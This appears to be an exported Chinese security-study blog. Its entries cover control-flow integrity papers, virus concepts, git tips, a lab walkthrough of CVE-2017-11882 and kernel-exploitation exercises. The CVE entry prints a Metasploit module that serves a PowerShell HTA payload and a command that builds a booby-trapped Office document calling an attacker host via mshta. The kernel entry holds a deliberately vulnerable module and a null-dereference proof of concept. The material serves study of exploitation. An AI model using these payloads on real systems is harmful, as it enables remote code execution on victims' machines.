    <title>Losing Control: On the Effectiveness of Control- Flow Integrity Under Stack Attacks</title>
    <url>/2021/08/01/losing-control-on-the-effectiveness-of-control-flow-integrity-under-stack-attacks/</url>
    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><blockquote>
<p>文章速览: 本篇文章主要针对IFCC</p>
</blockquote>
<h2 id="结论与观点"><a href="#结论与观点" class="headerlink" title="结论与观点"></a>结论与观点</h2><ul>
<li>永不信任可写区域的内存？那代码动态产生怎么办？代码的灵活性会大大降低。不太现实...</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">Since DEP prevents code injection, code reuse has become
a key technique in modern exploits that bypass all
current mitigations.
DEP的出现使得代码复用技术成为了攻击的关键技术<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">CPI protects code
pointers from being overwritten, and randomization hides
the code layout.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">IFCC and VTV [50], are vulnerable to this kind of attack.
这类attack指的是修改callee-saved-reg值的attack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">攻击影子堆栈的思路：覆盖syscall的返回值，关键系统调用：sysenter
原因:kernel mode下，函数返回不会被检查<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="问题与讨论"><a href="#问题与讨论" class="headerlink" title="问题与讨论"></a>问题与讨论</h2><ul>
<li>CFI在保护的同时会造成其它信息的泄露？<ul>
<li>不会，但是CFI会用到某些callee saved registers，并且它们会被存放到栈上，从而被泄露</li>
</ul>
</li>
<li>what is COOP?</li>
<li>What is TLS？</li>
<li>Isolation-based Defenses</li>
</ul>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{conti2015losing,<br>  title={Losing control: On the effectiveness of control-flow integrity under stack attacks},<br>  author={Conti, Mauro and Crane, Stephen and Davi, Lucas and Franz, Michael and Larsen, Per and Negro, Marco and Liebchen, Christopher and Qunaibit, Mohaned and Sadeghi, Ahmad-Reza},<br>  booktitle={Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security},<br>  pages={952--963},<br>  year={2015}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
        <tag>attack</tag>
      </tags>
  </entry>
  <entry>
    <title>Mitigating Code-Reuse Attacks with Control-Flow Locking</title>
    <url>/2021/08/17/mitigating-code-reuse-attacks-with-control-flow-locking/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Modular control-flow integrity</title>
    <url>/2021/07/27/modular-control-flow-integrity/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><blockquote>
<p>关键词：seperate compilation<br>总览：解决了动态链接时构建CFI困难的问题，通过在构建两个table(没看懂)来实现CFI的功能，并在每次动态链接的时候生成新的CFG(使用类型分析方法),并相应的更新IDs table来实现动态链接程序的CFI。</p>
</blockquote>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul>
<li>CFI在遇到动态链接代码的时候会遇到什么样的问题？</li>
</ul>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{niu2014modular,<br>  title={Modular control-flow integrity},<br>  author={Niu, Ben and Tan, Gang},<br>  booktitle={Proceedings of the 35th ACM SIGPLAN Conference on Programming Language Design and Implementation},<br>  pages={577--587},<br>  year={2014}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
      </tags>
  </entry>
  <entry>
    <title>Out of Control: Overcoming Control-Flow Integrity</title>
    <url>/2021/08/01/out-of-control-overcoming-control-flow-integrity/</url>
    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><blockquote>
<p>文章速览:</p>
<ol>
<li>评估了当前CFI的安全性</li>
<li>构造了利用链</li>
<li>给出IE8 On Windows 7的POC</li>
</ol>
</blockquote>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{goktas2014out,
  title={Out of control: Overcoming control-flow integrity},
  author={G{\"o}ktas, Enes and Athanasopoulos, Elias and Bos, Herbert and Portokalidis, Georgios},
  booktitle={2014 IEEE Symposium on Security and Privacy},
  pages={575--589},
  year={2014},
  organization={IEEE}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
        <tag>S&amp;P</tag>
      </tags>
  </entry>
  <entry>
    <title>Practical Control Flow Integrity and Randomization for Binary Executables</title>
    <url>/2021/07/30/practical-control-flow-integrity-and-randomization-for-binary-executables/</url>
    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ul>
<li>ASLR &amp; DEP</li>
<li>代码不会自我修改或者自动生成<h2 id="问题与讨论"><a href="#问题与讨论" class="headerlink" title="问题与讨论"></a>问题与讨论</h2></li>
<li>CFI难以在工业中应用的难点？<ul>
<li>overhead</li>
<li>依赖source code</li>
</ul>
</li>
<li>如何实现其Binary only的特性？</li>
<li>在二进制中如何识别indirect call/jmp instructions？<ul>
<li>做了一些假设，主要是根据重定位表等信息来获取合法调用目标</li>
</ul>
</li>
<li>针对该方法的攻击？<ul>
<li>伪造合法目标</li>
<li>改变内存页面保护属性或者直接添加伪造目标</li>
<li>使用程序中的危险目标</li>
<li>链式攻击，通过一连串合法的目标最终调用危险函数</li>
</ul>
</li>
</ul>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{zhang2013practical,<br>  title={Practical control flow integrity and randomization for binary executables},<br>  author={Zhang, Chao and Wei, Tao and Chen, Zhaofeng and Duan, Lei and Szekeres, Laszlo and McCamant, Stephen and Song, Dawn and Zou, Wei},<br>  booktitle={2013 IEEE Symposium on Security and Privacy},<br>  pages={559--573},<br>  year={2013},<br>  organization={IEEE}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>CFI</tag>
      </tags>
  </entry>
  <entry>
    <title>RWset: Attacking Path Explosion in Constraint-Based Test Generation</title>
    <url>/2021/07/16/rwset-attacking-path-explosion-in-constraint-based-test-generation/</url>
    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
<ol>
<li>主题：减少符号执行的路径爆炸问题</li>
<li>主要思想：剪枝<ol>
<li>某次执行与前次执行的影响相似 pruned</li>
<li>某次执行与前次执行只受接下来输入数据的影响 pruned</li>
</ol>
</li>
</ol>
<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{boonstoppel2008rwset,<br>  title={RWset: Attacking path explosion in constraint-based test generation},<br>  author={Boonstoppel, Peter and Cadar, Cristian and Engler, Dawson},<br>  booktitle={International conference on Tools and Algorithms for the Construction and Analysis of Systems},<br>  pages={351--366},<br>  year={2008},<br>  organization={Springer}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>VBS脚本病毒和宏病毒</title>
    <url>/2021/08/10/vbs-jiao-ben-bing-du-he-hong-bing-du/</url>
    <content><![CDATA[<h1 id="VBS脚本病毒"><a href="#VBS脚本病毒" class="headerlink" title="VBS脚本病毒"></a>VBS脚本病毒</h1><h2 id="VBS的概念和使用"><a href="#VBS的概念和使用" class="headerlink" title="VBS的概念和使用"></a>VBS的概念和使用</h2><p>轻量级解释型语言</p>
<p>管理远程或本地计算机</p>
<h2 id="传播方式"><a href="#传播方式" class="headerlink" title="传播方式"></a>传播方式</h2><ol>
<li>自我复制</li>
<li>Email传播</li>
<li>局域网共享文件搜索</li>
<li>其它传播方式：网页、IRC</li>
</ol>
<h2 id="自我保护"><a href="#自我保护" class="headerlink" title="自我保护"></a>自我保护</h2><ol>
<li>自加密</li>
<li>检测危险对象</li>
<li>改变对象声明的方法</li>
<li>尝试关闭反病毒软件</li>
</ol>
<h1 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h1><h2 id="什么是宏？"><a href="#什么是宏？" class="headerlink" title="什么是宏？"></a>什么是宏？</h2><p>组织到一起的命令</p>
<p>VBA</p>
<h2 id="传播方式-1"><a href="#传播方式-1" class="headerlink" title="传播方式"></a>传播方式</h2><p>支持自动执行宏</p>
<p>感染：</p>
<ol>
<li>内建宏 单个文档</li>
<li>全局宏 模板</li>
</ol>
<p>感染路径：</p>
<ol>
<li>单机：单个文档→模板→多个文档</li>
<li>网络：电子邮件</li>
</ol>
<h2 id="自我保护-1"><a href="#自我保护-1" class="headerlink" title="自我保护"></a>自我保护</h2><ol>
<li>禁止提示信息</li>
<li>屏蔽命令菜单</li>
<li>隐藏真实代码</li>
</ol>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>脚本病毒</tag>
        <tag>宏病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>Precise and Scalable Detection of Double-Fetch Bugs in OS Kernels</title>
    <url>/2021/07/16/precise-and-scalable-detection-of-double-fetch-bugs-in-os-kernels/</url>
    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><p>文章速览：</p>
<ol>
<li>主题：检测double-fetch bug</li>
<li>核心内容：为double-fetch bug作了形式化定义<ol>
<li>There are at least two reads from userspace memory</li>
<li>The two fetches must cover an overlapped memory region in the userspace</li>
<li>A relation must exist based on the overlapped regions between the two fetches</li>
<li>DEADLINE cannot prove that the relation established still holds after the second fetch</li>
</ol>
</li>
</ol>
<h2 id="1-1-limitations"><a href="#1-1-limitations" class="headerlink" title="1.1. limitations"></a>1.1. limitations</h2><ol>
<li>Source code coverage<ol>
<li>not compiled code</li>
<li>cofing_*=n</li>
</ol>
</li>
<li>Path construction<ol>
<li>limit execution path within an enclosing function</li>
<li>unrolling times of loop</li>
</ol>
</li>
<li>Symbolic checking<ol>
<li>pointers</li>
<li>inline assemblies</li>
<li>incomplete assumptions on enclosing functions</li>
</ol>
</li>
</ol>
<h2 id="1-2-讨论"><a href="#1-2-讨论" class="headerlink" title="1.2. 讨论"></a>1.2. 讨论</h2><ol>
<li>What is double-fetch bug？<br> Sometimes，we use some cirtical value fetched from userspace.These values should be checked for security before using,while if we fetched them twice,and the first time before checking,the second time after checing but before using,double-fetch bug may be triggered.   </li>
</ol>
<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{xu2018precise,<br>  title={Precise and scalable detection of double-fetch bugs in OS kernels},<br>  author={Xu, Meng and Qian, Chenxiong and Lu, Kangjie and Backes, Michael and Kim, Taesoo},<br>  booktitle={2018 IEEE Symposium on Security and Privacy (SP)},<br>  pages={661--678},<br>  year={2018},<br>  organization={IEEE}<br>}</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>cve-2017-11882漏洞分析</title>
    <url>/2021/08/14/cve-2017-11882-lou-dong-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><pre class="line-numbers language-none"><code class="language-none">实验环境：
1. kali 2020.03 ip:192.168.98.200
2. windows 7 x64 + office 2016
3. msf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="POC-计算器"><a href="#POC-计算器" class="headerlink" title="POC-计算器"></a>POC-计算器</h2><p>poc来源：<a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a><br>打开example.rtf,弹出计算器。    </p>
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E8%AE%A1%E7%AE%97%E5%99%A8.png" class="">

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>msf利用脚本</p>
<pre class="line-numbers language-rb" data-language="rb"><code class="language-rb">## This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule  &lt; Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info  = {})
    super(update_info(info,
      'Name' =&gt; 'Microsoft Office Payload Delivery',
      'Description' =&gt; %q{
        This module generates an command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server. Currently have not figured out how
        to generate a doc.
      },
      'License' =&gt; MSF_LICENSE,
      'Arch' =&gt; ARCH_X86,
      'Platform' =&gt; 'win',
      'Targets' =&gt;
        [
          ['Automatic', {} ],
        ],
      'DefaultTarget' =&gt; 0,
    ))
  end

  def on_request_uri(cli, _request)
    print_status("Delivering payload")
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      'win',
      p.encoded,
      'hta-psh',
      { :arch =&gt; ARCH_X86, :platform =&gt; 'win '}
    )
    send_response(cli, data, 'Content-Type' =&gt; 'application/hta')
  end


  def primer
    url = get_uri
    print_status("Place the following DDE in an MS document:")
    print_line("mshta.exe \"#{url}\"")
  end
end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将脚本放入/usr/share/metasploit-framework/modules/exploits/windows目录中。</p>
<h3 id="生成doc文档"><a href="#生成doc文档" class="headerlink" title="生成doc文档"></a>生成doc文档</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 生成doc文档
python Command109b_CVE-2017-11882.py -c "mshta http://192.168.98.200:8080/abc" -o test.doc

# 方便靶机下载
python -m SimpleHTTPServer 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>靶机访问 <a href="http://192.168.98.200:6666/">http://192.168.98.200:6666/</a> 下载test.doc</p>
<h3 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h3><img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A81.png" class="">   
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A82.png" class="">   
<p>靶机打开test.doc<br>利用成功    </p>
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A83.png" class="">   
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A84.png" class="">   

]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
  </entry>
  <entry>
    <title>git</title>
    <url>/2021/06/07/git/</url>
    <content><![CDATA[<h1 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h1><h2 id="恢复到上个状态"><a href="#恢复到上个状态" class="headerlink" title="恢复到上个状态"></a>恢复到上个状态</h2><pre class="line-numbers language-none"><code class="language-none">git reset --hard &lt;log SHA&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="pull-push"><a href="#pull-push" class="headerlink" title="pull/push"></a>pull/push</h1><h2 id="拉取仓库"><a href="#拉取仓库" class="headerlink" title="拉取仓库"></a>拉取仓库</h2><pre class="line-numbers language-none"><code class="language-none">git pull origin remote-branch:local-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h1><pre class="line-numbers language-none"><code class="language-none"># 将XXX分支合并到当前分支
git merge xxx <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><h2 id="Permission-denied-PublicKey"><a href="#Permission-denied-PublicKey" class="headerlink" title="Permission denied(PublicKey)"></a>Permission denied(PublicKey)</h2><p>产生原因：<br>之前配置的ssh key过期了     </p>
<p>解决方案(Linux OS)：<br>ssh-keygen<br>cat ~/.ssg/id_rsa.pub<br>复制其中的内容<br>登录github账号<br>选择settings/SSH &amp; GPG Keys 创建新的SSH key</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>jar包调试</title>
    <url>/2021/07/23/jar-bao-diao-shi/</url>
    <content><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>解压jar包，并选择IDEA打开</p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><ol>
<li>Debug模式启动jar包<pre class="line-numbers language-none"><code class="language-none">java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar test.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>IDEA run菜单下添加configuration，添加remote目标</li>
<li>run</li>
</ol>
<h1 id="修改jar包"><a href="#修改jar包" class="headerlink" title="修改jar包"></a>修改jar包</h1><blockquote>
<p>注意点：解压缩的时候要用java自带的解压缩工具，否则可能会出错</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>kernel-pwn之demo-null-deference</title>
    <url>/2021/05/12/kernel-pwn-zhi-demo-null-deference/</url>
    <content><![CDATA[<h1 id="内核API函数proc-create"><a href="#内核API函数proc-create" class="headerlink" title="内核API函数proc_create"></a>内核API函数<a href="https://www.jianshu.com/p/2ddd32527367">proc_create</a></h1><blockquote>
<p>在新版内核中，proc_create函数取代了create_proc_entry</p>
</blockquote>
<h2 id="Proc文件系统"><a href="#Proc文件系统" class="headerlink" title="Proc文件系统"></a>Proc文件系统</h2><p>虚拟的文件系统，理解为内核对用户开放的接口，用户通过它读取、修改内核进程数据</p>
<h3 id="创建porc-file"><a href="#创建porc-file" class="headerlink" title="创建porc file"></a>创建porc file</h3><ul>
<li>实现file_operation结构体，主要是实现read和write接口</li>
<li>用proc_create注册到内核</li>
<li>然后在/proc目录下可以找到对应的文件，通过它可以实现用户进程与内核的通信<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3></li>
<li>补充  <ul>
<li>module_param()<br>在用户态中，可以通过main()函数的参数传递命令行参数给程序，在内核态中，则使用module_param()传递命令行参数。<br>原型:module_param(name,type,perm)<br>name：既是用户看到的参数名，又是模块内接受参数的变量；<br>type: 表示参数的类型;<br>perm: 指定了在sysfs中相应文件的访问权限;            </li>
<li>copy_to_user/copy_from_user<br>内核空间和用户空间的内存不能直接互访，需要借助上述两个函数完成内核空间与用户空间之间数据的拷贝。<br>新版本的内核中被raw_copy_to(from)_user代替。</li>
</ul>
</li>
<li>示例代码<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;linux/module.h&gt;
#include &lt;linux/moduleparam.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/kernel.h&gt;   
#include &lt;linux/proc_fs.h&gt;
#include &lt;asm/uaccess.h&gt;
#define BUFSIZE  100


MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Liran B.H");

static int irq=20;
module_param(irq,int,0660);

static int mode=1;
module_param(mode,int,0660);

static struct proc_dir_entry *ent;

// 修改irq、mode值
static ssize_t mywrite(struct file *file, const char  __user *ubuf, size_t count, loff_t *ppos) 
{
        int num,c,i,m;
        char buf[BUFSIZE];
        if(*ppos &gt; 0 || count &gt; BUFSIZE)
                return -EFAULT;
        if(raw_copy_from_user(buf, ubuf, count))
                return -EFAULT;
        num = sscanf(buf,"%d %d",&amp;i,&amp;m);
        if(num != 2)
                return -EFAULT;
        irq = i; 
        mode = m;
        c = strlen(buf);
        *ppos = c;
        return c;
}

// 读取irq、mode值
static ssize_t myread(struct file *file, char __user *ubuf,  size_t count, loff_t *ppos) 
{
        char buf[BUFSIZE];
        int len=0;
        if(*ppos &gt; 0 || count &lt; BUFSIZE)
                return 0;
        len += sprintf(buf,"irq = %d\n",irq);
        len += sprintf(buf + len,"mode = %d\n",mode);
        
        if(raw_copy_to_user(ubuf,buf,len))
                return -EFAULT;
        *ppos = len;
        return len;
}

// 定义file_operations数据结构
static struct file_operations myops = 
{
        .owner = THIS_MODULE,
        .read = myread,
        .write = mywrite,
};

static int simple_init(void)
{
        // 注册1个名称为mydev的proc文件，权限为666
        // 对应的file_operations为myops
        ent=proc_create("mydev",0666,NULL,&amp;myops);
        printk(KERN_ALERT "hello...\n");
        return 0;
}

static void simple_cleanup(void)
{
        // 删除ent指向的porc文件
        proc_remove(ent);
        printk(KERN_WARNING "bye ...\n");
}

// 模块声明
module_init(simple_init);       
module_exit(simple_cleanup);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li>Makefile<br>参考<a href="/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/" title="linux驱动模块编写">linux驱动模块编写</a></li>
<li>测试<img src="/2021/05/12/kernel-pwn-zhi-demo-null-deference/proc_create%E6%B5%8B%E8%AF%95.jpg" class="">
<ul>
<li>user_app.c<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
 
void main(void)
{
    char buf[100];
    int fd = open("/proc/mydev", O_RDWR);
    read(fd, buf, 100);
    puts(buf);
 
    lseek(fd, 0 , SEEK_SET);
    write(fd, "33 4", 5);
    
    lseek(fd, 0 , SEEK_SET);
    read(fd, buf, 100);
    puts(buf);
}   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
gcc -static user_app.c -o user_app</li>
<li>测试                <img src="/2021/05/12/kernel-pwn-zhi-demo-null-deference/proc_create%E6%B5%8B%E8%AF%952.png" class=""></li>
</ul>
</li>
</ul>
<h1 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;linux/module.h&gt;
#include &lt;linux/moduleparam.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/kernel.h&gt;   
#include &lt;linux/proc_fs.h&gt;
#include &lt;asm/uaccess.h&gt;

static struct proc_dir_entry *bug1;

void (*my_funptr)(void);
 
static ssize_t bug1_write(struct file *file, const char __user *ubuf,  size_t count, loff_t *ppos)
{
        my_funptr();
        return count;
}

static struct file_operations bugops = 
{
        .owner = THIS_MODULE,
        .write = bug1_write,
};

static int __init null_dereference_init(void)
{
        printk(KERN_ALERT "null_dereference driver init!n");
        bug1=proc_create("bug1",0666,NULL,&amp;bugops);
        return 0;
}

static void __exit null_dereference_exit(void)
{
        proc_remove(bug1);
        printk(KERN_ALERT "null_dereference driver exit!n");
}

module_init(null_dereference_init);
module_exit(null_dereference_exit);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用方式参考上文</p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">//poc.c
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
char payload[] = "xe9xeaxbexadx0b";// jmp 0xbadbeef

int main(){
    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
    memcpy(0, payload, sizeof(payload));
    int fd = open("/proc/bug1", O_WRONLY);
    write(fd, "null", 4);
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>gcc</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://www.jianshu.com/p/2ddd32527367">如何使用内核API函数 proc_create?</a></li>
<li><a href="https://blog.csdn.net/panhewu9919/article/details/99441712">linux内核漏洞利用初探（2）：demo-null_dereference</a></li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
        <category>kernel-pwn</category>
      </categories>
      <tags>
        <tag>null-deference</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel-pwn之环境配置</title>
    <url>/2021/05/07/kernel-pwn-zhi-huan-jing-pei-zhi/</url>
    <content><![CDATA[<pre class="line-numbers language-none"><code class="language-none">实验环境: Ubuntu 20.04 64位
gcc版本: 9.3.0
内核版本: 5.4.5
BusyBox: 1.33.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="1-下载kernel源码"><a href="#1-下载kernel源码" class="headerlink" title="1. 下载kernel源码"></a>1. 下载kernel源码</h1><p>国内镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p>
<pre class="line-numbers language-none"><code class="language-none">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v2.6/linux-5.4.5.tar.gz -O linux-5.4.5.tar.gz
tar -xvf linux-5.4.5.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h1 id="2-编译kernel"><a href="#2-编译kernel" class="headerlink" title="2. 编译kernel"></a>2. 编译kernel</h1><pre class="line-numbers language-none"><code class="language-none">cd linux-5.4.5/
make menuconfig
make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">问题1： 
make[1]: *** No rule to make target 'debian/certs/benh@debian.org.cert.pem', needed by 'certs/x509_certificate_list'。 停止。
make[1]: *** 正在等待未完成的任务....
  CC      certs/system_keyring.o
  CC      kernel/groups.o
Makefile:1002: recipe for target 'certs' failed
make: *** [certs] Error 2

解决方案:
打开.config文件，注释掉
CONFIG_SYSTEM_TRUSTED_KEYS="debian/certs/benh@debian.org.cert.pem"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="3-增加syscall"><a href="#3-增加syscall" class="headerlink" title="3. 增加syscall"></a>3. 增加syscall</h1><h2 id="3-1-在syscall-table中添加信息"><a href="#3-1-在syscall-table中添加信息" class="headerlink" title="3.1. 在syscall table中添加信息"></a>3.1. 在syscall table中添加信息</h2><p>因为编译出来的内核是64位的，所以要在“./linux-5.4.5/arch/x86/entry/syscalls/syscall_64.tbl”中添加</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&lt;num&gt;    &lt;abi&gt;  &lt;name&gt;                    &lt;entry point&gt;
436     common  hello                   __x64_sys_hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="3-2-增加syscall的宏"><a href="#3-2-增加syscall的宏" class="headerlink" title="3.2. 增加syscall的宏"></a>3.2. 增加syscall的宏</h2><p>在“linux-5.4.5/include/uapi/asm-generic/unistd.h”中修改：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">#define __NR_hello 436
__SYSCALL(__NR_hello, sys_hello)

#undef __NR_syscalls
#define __NR_syscalls 437   //系统调用的个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="3-3-添加函数定义"><a href="#3-3-添加函数定义" class="headerlink" title="3.3. 添加函数定义"></a>3.3. 添加函数定义</h2><p>在include/linux/syscalls.h中添加：    </p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">asmlinkage long sys_hello(void);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
